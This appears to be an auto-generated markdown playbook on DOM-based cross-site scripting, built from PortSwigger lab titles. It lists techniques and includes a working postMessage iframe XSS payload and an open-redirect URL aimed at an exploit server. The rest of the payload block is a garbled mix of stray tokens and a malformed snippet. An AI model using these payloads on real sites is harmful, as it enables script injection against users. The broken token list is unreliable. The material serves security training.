## XSS DOM Playbook
*Synthesized from 7 PortSwigger labs*

### Overview
This playbook covers 7 known attack techniques for xss_dom.

### Attack Techniques

**Bypass Techniques:**
- Clobbering DOM attributes to bypass HTML filters

**DOM-based:**
- DOM XSS using web messages
- DOM XSS using web messages and a JavaScript URL
- DOM XSS using web messages andJSON.parse
- DOM-based cookie manipulation
- Exploiting DOM clobbering to enable XSS
- DOM-based open redirection

### Key Payloads
```
<iframe src="https://[LAB_ID].[TARGET]/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
JSON.parse()
postId
name
https://[LAB_ID].[TARGET]/post?postId=4&url=https://[EXPLOIT_SERVER]-ID.exploit-server.net/
<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
switch
[LAB_ID]
alert()
addEventListener()
indexOf()
ACMEplayer.element
attributes
type
"avatar"
onload
form
defaultAvatar
href
loadCommentsWithDomClobbering.js
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

